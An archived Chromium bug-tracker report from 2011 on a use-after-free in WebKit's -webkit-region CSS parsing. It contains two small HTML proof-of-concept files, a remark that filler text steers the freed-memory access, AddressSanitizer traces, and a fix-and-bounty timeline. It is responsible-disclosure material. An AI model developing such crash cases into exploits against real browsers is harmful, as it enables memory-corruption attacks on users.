# Security: Adobe regions use-after-free with multiple region css thingies

| Field | Value |
|-------|-------|
| **Issue ID** | [40050734](https://issues.chromium.org/issues/40050734) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | mi...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2011-11-02 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

easily controlled use-after-free

**VERSION**  

Chrome Version:

Chromium 17.0.926.0 (Developer Build 108154)  

OS Linux  

WebKit 535.8 (trunk@98806)  

JavaScript V8 3.6.6.3  

Flash 11.0 r1

Operating System: 64bit oneiric

**REPRODUCTION CASE**

<html>
<head>
<style>
#region1 { }
@-webkit-region #region1
@-webkit-region #region1 { }
</style>
</head>
<body>
</body>
</html>

by adding random stuff in the file, the offset and size of accesses can be manipulated:

<html>
<head>
<style>
#region1 { aaaaaaa }
@-webkit-region #region1 aa
@-webkit-region #region1 { }
</style>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==18698== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe3e7fe9c at pc 0x7ffff2db299f bp 0x7fffffff9340 sp 0x7fffffff9338  

READ of size 4 at 0x7fffe3e7fe9c thread T0  

#0 0x7ffff2db299f in WebCore::CSSStyleSheet::isLoading() ???:0  

#1 0x7ffff2db29ea in WebCore::CSSStyleSheet::checkLoaded() ???:0

0x7fffe3e7fe9c is located 28 bytes inside of 186-byte region [0x7fffe3e7fe80,0x7fffe3e7ff3a)  

freed by thread T0 here:  

#0 0x7ffff5d5ec66 in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:29  

#1 0x7ffff2c78431 in WebCore::CSSParser::~CSSParser() ???:0  

#2 0x7ffff2db2887 in WebCore::CSSStyleSheet::parseStringAtLine(WTF::String const&, bool, int) ???:0

==13581== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe3e802b0 at pc 0x7ffff2db299f bp 0x7fffffff9340 sp 0x7fffffff9338  

READ of size 4 at 0x7fffe3e802b0 thread T0  

#0 0x7ffff2db299f in WebCore::CSSStyleSheet::isLoading() ???:0

0x7fffe3e802b0 is located 48 bytes inside of 208-byte region [0x7fffe3e80280,0x7fffe3e80350)  

freed by thread T0 here:  

#0 0x7ffff5d5ec66 in free /usr/local/google/asan/address-sanitizer/asan/asan\_malloc\_linux.cc:29  

#1 0x7ffff2c78431 in WebCore::CSSParser::~CSSParser() ???:0  

#2 0x7ffff2db2887 in WebCore::CSSStyleSheet::parseStringAtLine(WTF::String const&, bool, int) ???:0

## Attachments

- [asan-parser.txt](attachments/asan-parser.txt) (text/x-c; charset=us-ascii, 10.6 KB)
- [parser2.html](attachments/parser2.html) (text/html; charset=us-ascii, 175 B)
- [asan-parser2.txt](attachments/asan-parser2.txt) (text/x-c; charset=us-ascii, 10.6 KB)
- [parser.html](attachments/parser.html) (text/html; charset=us-ascii, 164 B)

## Timeline

### sc...@gmail.com (2011-11-03)

Yeah, this faults a trunk build pretty easily without even ASAN.

Fortunately, M16 branched prior to the start of this new -webkit-region landing. M17, out today, will be affected but we'll fix this before M17 Beta, ideally. Upstream bug to follow.

### sc...@gmail.com (2011-11-03)

https://bugs.webkit.org/show_bug.cgi?id=71514

### sc...@gmail.com (2011-11-04)

Committed r99306: <http://trac.webkit.org/changeset/99306>

Hopefully taken care of, sir? Good regression catch!

### mi...@gmail.com (2011-11-05)

@scarybasts: Fixed for me. thank you.

### sc...@gmail.com (2011-11-17)

@miaubiz: wow, you're really nailing these new features to the wall. Thanks for catching all these bugs before they reach stable. $1000, obviously.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-11-23)

Payment in system.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/102628?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050734)*
